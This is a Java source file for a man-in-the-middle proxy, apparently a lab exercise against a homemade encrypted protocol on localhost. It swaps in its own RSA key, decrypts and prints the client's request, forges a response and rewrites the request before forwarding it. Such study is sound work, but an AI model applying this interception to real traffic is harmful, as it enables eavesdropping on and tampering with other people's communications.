import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.security.KeyFactory;
import java.security.KeyPair;
import java.security.PublicKey;
import java.security.spec.X509EncodedKeySpec;

public class SimpleProxyMITM {

    public static void main(String[] args) throws Exception{
        int proxyPort = 9090;
        ServerSocket serverSocket = new ServerSocket(proxyPort);

        System.out.println("Proxy running on port " + proxyPort);

        while (true){
            Socket socket = serverSocket.accept();
            new Thread(() -> {
                try {
                    handle(socket);
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }).start();
        }

    }

    private static void handle(Socket clientSocket) throws IOException {
        try{
            System.out.println("\n=== New Proxy Connection ===");

            InputStream clientInputStream = clientSocket.getInputStream();
            OutputStream clientOutputStream = clientSocket.getOutputStream();
            DataManager clientDataManager = new DataManager(clientOutputStream, clientInputStream);

            Socket serverSocket = new Socket("localhost", 8080);
            InputStream serverInputStream = serverSocket.getInputStream();
            OutputStream serverOutputStream = serverSocket.getOutputStream();
            DataManager serverDataManager = new DataManager(serverOutputStream, serverInputStream);

            //get and proxy HELLO
            clientDataManager.getData();
            serverDataManager.sendData("HELLO".getBytes());

            //get server public key, generate symmetric key and send it
            String serverPulicKey = new String(serverDataManager.getData());
            byte[] pubKeyBytes = CryptoUtils.decodeBase64(serverPulicKey);
            KeyFactory keyFactory = KeyFactory.getInstance("RSA");
            PublicKey publicKey = keyFactory.generatePublic(
                    new X509EncodedKeySpec(pubKeyBytes)
            );
            byte serverSymmetricKey = 0x10;
            serverDataManager.sendData(CryptoUtils.rsaEncrypt(new byte[]{serverSymmetricKey}, publicKey));
            serverDataManager.getData(); //receive ok


            //Send a public key to client
            KeyPair keyPair = CryptoUtils.generateRSAKeyPair();
            String publicKeyBase64 = CryptoUtils.encodeBase64(keyPair.getPublic().getEncoded());
            clientDataManager.sendData(publicKeyBase64.getBytes());
            byte[] symetricKeyRSAEncryptedData = clientDataManager.getData();
            byte clientSymmetricKey = CryptoUtils.rsaDecrypt(symetricKeyRSAEncryptedData, keyPair.getPrivate())[0];
            clientDataManager.sendData("OK".getBytes()); //send ok

            //receive client request
            byte[] encryptedRequest = clientDataManager.getData();
            byte[] request = CryptoUtils.decrypt(encryptedRequest, clientSymmetricKey);
            System.out.println("REQUEST CLIENT:");
            System.out.println(new String(request));

            //send response to client, mimic server
            String responseToClient =
                    "HTTP/1.1 200 OK\r\n" +
                            "Content-Type: text/plain\r\n" +
                            "\r\n" +
                            "Hello from proxy";
            byte[] encryptedResponse = CryptoUtils.encrypt(responseToClient.getBytes(), clientSymmetricKey);
            clientDataManager.sendData(encryptedResponse);

            //modify client request
            String modifiedRequest = new String(request).replace("admin", "nimda");

            //send modified request to server
            serverDataManager.sendData(CryptoUtils.encrypt(modifiedRequest.getBytes(), serverSymmetricKey));

            //get server response
            byte[] responseEncrypted = serverDataManager.getData();
            String response = new String(CryptoUtils.decrypt(responseEncrypted, serverSymmetricKey));

            System.out.println("RESPONSE SERVER:");
            System.out.println(response);


            System.out.println("=== FINISHED MITM ===");

        } catch (Exception e){
            e.printStackTrace();
        }
    }

}
